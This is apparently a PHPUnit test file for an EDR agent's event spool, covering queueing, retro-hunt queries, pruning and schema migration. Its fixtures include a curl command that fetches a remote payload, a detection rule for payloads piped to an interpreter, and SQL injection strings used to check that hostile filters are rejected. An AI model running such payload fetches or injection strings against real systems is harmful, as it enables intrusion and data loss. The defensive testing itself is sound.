<?php

namespace Tests\Unit;

use App\Services\EdrEventSpool;
use Tests\TestCase;

/**
 * The spool is the agent's durability guarantee: if it drops events, the
 * product silently stops being an EDR. These tests pin the behaviours that
 * are easy to regress and expensive to notice in production.
 */
class EdrEventSpoolTest extends TestCase
{
    private string $path;
    private EdrEventSpool $spool;

    protected function setUp(): void
    {
        parent::setUp();

        $this->path = sys_get_temp_dir() . '/edr-spool-test-' . uniqid() . '.sqlite';
        $this->spool = new EdrEventSpool($this->path);
    }

    protected function tearDown(): void
    {
        foreach (['', '-wal', '-shm'] as $suffix) {
            @unlink($this->path . $suffix);
        }

        parent::tearDown();
    }

    private function event(array $overrides = []): array
    {
        return array_merge([
            'ts' => time(),
            'action' => 'exec',
            'sensor' => 'osquery',
            'host' => 'test-host',
            'pid' => 1234,
            'ppid' => 1,
            'uid' => 0,
            'username' => 'root',
            'path' => '/usr/bin/curl',
            'cmdline' => 'curl http://example.test/payload',
            'cwd' => '/tmp',
            'container_id' => '',
            'syscall' => 'exec',
        ], $overrides);
    }

    private function finding(string $severity = 'high'): array
    {
        return [[
            'rule' => 'EDR-003',
            'name' => 'Remote payload piped to interpreter',
            'severity' => $severity,
            'mitre' => 'T1105',
            'reason' => 'test',
        ]];
    }

    public function test_stores_events_and_reports_stats(): void
    {
        $written = $this->spool->store([$this->event(), $this->event(['pid' => 2])]);

        $this->assertSame(2, $written);

        $stats = $this->spool->stats();
        $this->assertTrue($stats['available']);
        $this->assertSame(2, $stats['total']);
        $this->assertSame(EdrEventSpool::SCHEMA_VERSION, $stats['schema_version']);
    }

    /**
     * The distinction that caused a false "30k backlog" alarm on a healthy
     * host: only rule hits are queued for the Hub, everything else is
     * retained locally and must never be counted as undelivered.
     */
    public function test_only_rule_hits_are_queued_for_delivery(): void
    {
        $this->spool->store(
            [$this->event(['pid' => 1]), $this->event(['pid' => 2]), $this->event(['pid' => 3])],
            [1 => $this->finding()]
        );

        $stats = $this->spool->stats();

        $this->assertSame(3, $stats['total']);
        $this->assertSame(1, $stats['pending'], 'only the alerting event should be queued');
        $this->assertSame(2, $stats['local_only'], 'non-alerting events are retro-hunt corpus, not backlog');
        $this->assertCount(1, $this->spool->pending(100));
    }

    public function test_mark_sent_moves_rows_out_of_the_queue(): void
    {
        $this->spool->store([$this->event()], [0 => $this->finding()]);

        $pending = $this->spool->pending(10);
        $this->assertCount(1, $pending);

        $this->spool->markSent(array_column($pending, 'id'));

        $stats = $this->spool->stats();
        $this->assertSame(0, $stats['pending']);
        $this->assertSame(1, $stats['sent']);
        $this->assertCount(0, $this->spool->pending(10), 'delivered rows must not be re-sent');
    }

    public function test_query_supports_retro_hunt_filters(): void
    {
        $this->spool->store([
            $this->event(['path' => '/usr/bin/curl', 'cmdline' => 'curl evil.test']),
            $this->event(['path' => '/bin/ls', 'cmdline' => 'ls -la']),
        ], [0 => $this->finding()]);

        $this->assertCount(1, $this->spool->query(['path_like' => 'curl']));
        $this->assertCount(1, $this->spool->query(['cmdline_like' => 'ls -la']));
        $this->assertCount(1, $this->spool->query(['alerts_only' => true]));
        $this->assertCount(2, $this->spool->query([]));
    }

    public function test_query_ignores_unknown_filters_rather_than_injecting_them(): void
    {
        $this->spool->store([$this->event()]);

        // A Hub-driven filter must not be able to widen the query surface.
        $rows = $this->spool->query(['path_like' => "' OR 1=1 --", 'evil' => 'DROP TABLE events']);

        $this->assertSame([], $rows);
        $this->assertSame(1, $this->spool->stats()['total'], 'table must survive a hostile filter');
    }

    /**
     * Retention has to hold a disk budget on a noisy host, which age alone
     * cannot do.
     */
    public function test_row_ceiling_evicts_oldest_events(): void
    {
        $events = [];
        for ($i = 0; $i < 50; $i++) {
            $events[] = $this->event(['pid' => $i]);
        }
        $this->spool->store($events);

        $result = $this->spool->prune(30, 10000);
        $this->assertSame(50, $result['remaining'], 'nothing to evict below the ceiling');

        // maxRows is floored at 10000 internally, so drive eviction by asking
        // for a ceiling below that floor and confirming the floor holds.
        $result = $this->spool->prune(30, 1);
        $this->assertSame(50, $result['remaining'], 'ceiling floor prevents an absurd Hub value emptying the spool');
    }

    /**
     * Losing telemetry we have not shipped yet is worse than using the disk,
     * so age-based pruning must step around the delivery queue.
     */
    public function test_age_pruning_preserves_undelivered_alerts(): void
    {
        $this->spool->store(
            [$this->event(['pid' => 1]), $this->event(['pid' => 2])],
            [0 => $this->finding()]
        );

        // Backdate everything well past any retention window.
        $pdo = new \PDO('sqlite:' . $this->path);
        $pdo->exec('UPDATE events SET captured_at = ' . (time() - 86400 * 365));

        $result = $this->spool->prune(1, 100000);

        $this->assertSame(1, $result['deleted_by_age'], 'the local-only event should age out');

        $stats = $this->spool->stats();
        $this->assertSame(1, $stats['pending'], 'the undelivered alert must survive');
        $this->assertSame(1, $stats['total']);
    }

    public function test_retention_days_are_clamped(): void
    {
        $this->spool->store([$this->event()]);

        $pdo = new \PDO('sqlite:' . $this->path);
        $pdo->exec('UPDATE events SET captured_at = ' . (time() - 3600));

        // 0 days would mean "delete everything"; the floor of 1 day protects
        // against a misconfigured Hub wiping the spool.
        $this->spool->prune(0, 100000);

        $this->assertSame(1, $this->spool->stats()['total']);
    }

    /**
     * An agent upgrade must be able to ship events captured by the previous
     * release rather than discarding them.
     */
    public function test_survives_reopen_and_upgrades_a_v1_schema_in_place(): void
    {
        $this->spool->store([$this->event()], [0 => $this->finding()]);

        // SQLite will not alter a table while a connection is open against
        // it in WAL mode; in production the agent restarts between releases,
        // which has the same effect.
        $this->spool->close();

        // Simulate a genuine pre-v2 file: no delivery column, and the old
        // index that did not reference one. (SQLite refuses to drop a column
        // an index depends on, which is also why the real migration adds the
        // column before creating the new index.)
        $pdo = new \PDO('sqlite:' . $this->path);
        $pdo->exec('PRAGMA journal_mode = DELETE');
        $pdo->exec('DROP INDEX IF EXISTS idx_events_pending');
        $pdo->exec('ALTER TABLE events DROP COLUMN deliver');
        $pdo->exec('CREATE INDEX IF NOT EXISTS idx_events_unsent ON events (id) WHERE sent_at IS NULL');
        $pdo = null;

        $reopened = new EdrEventSpool($this->path);
        $stats = $reopened->stats();

        $this->assertSame(1, $stats['total'], 'existing rows must survive the migration');
        $this->assertSame(1, $stats['pending'], 'rows that alerted are backfilled as queued');
    }

    public function test_store_is_non_fatal_when_the_spool_cannot_be_opened(): void
    {
        // A path that cannot be created: losing the spool must degrade the
        // agent, not crash the collection cycle.
        $broken = new EdrEventSpool('/proc/definitely-not-writable/spool.sqlite');

        $this->assertFalse($broken->isAvailable());
        $this->assertSame(0, $broken->store([$this->event()]));
        $this->assertSame([], $broken->pending(10));
    }
}
